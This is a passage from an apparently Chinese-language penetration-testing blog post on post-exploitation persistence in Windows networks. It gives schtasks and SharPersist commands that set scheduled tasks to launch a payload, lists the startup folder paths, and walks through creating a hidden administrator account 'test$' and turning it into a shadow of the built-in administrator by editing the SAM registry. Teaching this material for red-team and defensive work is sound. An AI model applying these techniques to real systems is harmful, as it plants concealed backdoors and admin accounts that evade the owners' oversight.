+</span></span><span class="line"><span class="cl">/i  忽略任何限制立即运行任务  
+</span></span><span class="line"><span class="cl">schtasks /run /i /tn sctAutoRunTest  
+</span></span><span class="line"><span class="cl">查看定时任务  
+</span></span><span class="line"><span class="cl">/FO format 为输出制定格式。有效值：TABLE、LIST、CSV  
+</span></span><span class="line"><span class="cl">/V         显示详细任务输出  
+</span></span><span class="line"><span class="cl">/TN taskname 指定要检索其信息的任务名称，否则会检索所有任务名称的信息。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">schtasks /query /fo TABLE /tn sctAutorunTest  
+</span></span><span class="line"><span class="cl">schtasks /query /fo LIST /tn sctAutorunTest  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">显示详细任务输出  
+</span></span><span class="line"><span class="cl">schtasks /query /v /fo TABLE /tn sctAutorunTest  
+</span></span><span class="line"><span class="cl">schtasks /query /v /fo LIST /tn sctAutorunTest  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">删除定时任务  
+</span></span><span class="line"><span class="cl">/TN taskname 指定要删除的计划任务名称。可以使用通配符 &#34;*&#34; 来删除所有任务。  
+</span></span><span class="line"><span class="cl">/F 强制删除该任务，如果指定的任务当前正在运行，则抑制警告。  
+</span></span><span class="line"><span class="cl">schtasks /delete /tn sctAutoRunTest /f  </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="sharpersist使用" class="heading-element"><span>SharPersist使用</span>
+  <a href="#sharpersist%e4%bd%bf%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>添加定时任务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">管理员权限  
+</span></span><span class="line"><span class="cl">execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m add -o logon  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">普通用户组权限  
+</span></span><span class="line"><span class="cl">execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m add -o hourly  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m add -o daily  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看定时任务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">execute-assembly /root/SharPersist.exe -t schtask -m list -n &#34;sctAutorunTest&#34;  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>删除定时任务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">execute-assembly /root/SharPersist.exe -t schtask -c &#34;C:\Windows\System32\cmd.exe&#34; -a &#34;/c C:\Users\Public\sctAutorunTest.exe&#34; -n &#34;sctAutorunTest&#34; -m remove  </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="权限维持-隐蔽账号和启动" class="heading-element"><span>权限维持-隐蔽账号和启动</span>
+  <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-%e9%9a%90%e8%94%bd%e8%b4%a6%e5%8f%b7%e5%92%8c%e5%90%af%e5%8a%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="启动目录" class="heading-element"><span><strong>启动目录</strong></span>
+  <a href="#%e5%90%af%e5%8a%a8%e7%9b%ae%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>当前用户启动目录</strong><br>
+开始-运行（win+r）<br>
+<code>shell:startup</code><br>
+打开的文件夹即为当前用户的启动目录<br>
+仅对当前用户生效</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\f10wers13eicheng\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>所有用户启动目录</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell:common startup  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>打开的目录即为所有用户的启动文件夹</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup  </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="创建隐蔽账号" class="heading-element"><span>创建隐蔽账号</span>
+  <a href="#%e5%88%9b%e5%bb%ba%e9%9a%90%e8%94%bd%e8%b4%a6%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>创建账号</strong><br>
+在创建的用户名后加<code>$</code>，即为隐藏账户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user test$ admin /add #添加隐藏用户  
+</span></span><span class="line"><span class="cl">net localgroup administrators test$ /add #添加到管理员组中  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>导出注册表</strong><br>
+<code>[HKEY_LOCAL_MACHINE\SAM\SAM]</code><br>
+默认情况下这个项里没有任何内容，这是因为用户对它没有权限。右键菜单里为administrator赋予完全控制权限。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182103268.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182103268.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182103268.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182103268.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182103268.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182103268.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>[SAMDomains\AccountUserslNames]</code><br>
+项里显示了系统当前存在的所有账户，选中<code>test$</code>，在其右侧有一个名为&quot;默认&quot;，类型为<code>0x3eb</code>的键值。其中<code>3eb</code>就是<code>test$</code>用户<code>SID</code>的结尾，即RID(这里使用十六进制表示)<br>
+<code>[SAM\Domains\Account\Users]</code><br>
+里有一个以&quot;3EB&quot;结尾的子项，这两个项里存放了用户<code>test$</code>的信息。<br>
+在这两个项上单击右键，执行&quot;导出&quot;命令，将这两个项的值分别导出成扩展名为<code>.reg</code>的注册表文件<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182112620.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182112620.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182112620.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182112620.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182112620.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182112620.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>cmd下删除用户</strong><br>
+cmd中将<code>test$</code>用户删除，再次刷新注册表，此时上述的两项都没了<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182116544.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182116544.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182116544.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182116544.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182116544.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182116544.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<strong>导入注册表</strong><br>
+刚才导出的两个注册表文件重新导入，此时在注册表里就有了<code>test$</code>账户的信息，但无论在命令行还是图形界面都无法看到这个账户，账户就被彻底隐藏了。使用这个隐藏账户可以登陆系统，但缺点是仍然会产生用户配置文件，下面在对这个账户进一步处理，以使之完全隐藏。<br>
+<strong>修改注册表</strong><br>
+展开到上面的注册表项中，找到 administrator 用户 的 RID 值“1f4”,展开对应的“000001F4&quot;项，其右侧有一个名为F的键值，这个键值中就存放了用户的 SID。下面将这个键值的数据全部复制，并粘贴到“000003EB&quot;项的F键值中，也就是将administrator 用户的 SID 复制给了 test$,这样在操作系统内部，实际上就把 test$当做是 administrator, test$成了administrator 的影子账户，与其使用同一个用户配置文件，test$也就被彻底隐藏了。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182128863.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182128863.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182128863.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182128863.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182128863.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202503182128863.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="权限维持-cs相关插件" class="heading-element"><span>权限维持-CS相关插件</span>
+  <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-cs%e7%9b%b8%e5%85%b3%e6%8f%92%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="sharpersist" class="heading-element"><span>SharPersist</span>
+  <a href="#sharpersist" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>Adding Persist</strong><br>
+<a href="https://github.com/mandiant/SharPersist"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/mandiant/SharPersist</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-03-18 23:11:39">Updated on 2025-03-18&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" data-title="内网渗透-权限维持"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-tag" title="Tags - 权限维持">权限维持</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" class="post-nav-item" rel="prev" title="内网渗透-隧道搭建"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>内网渗透-隧道搭建</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
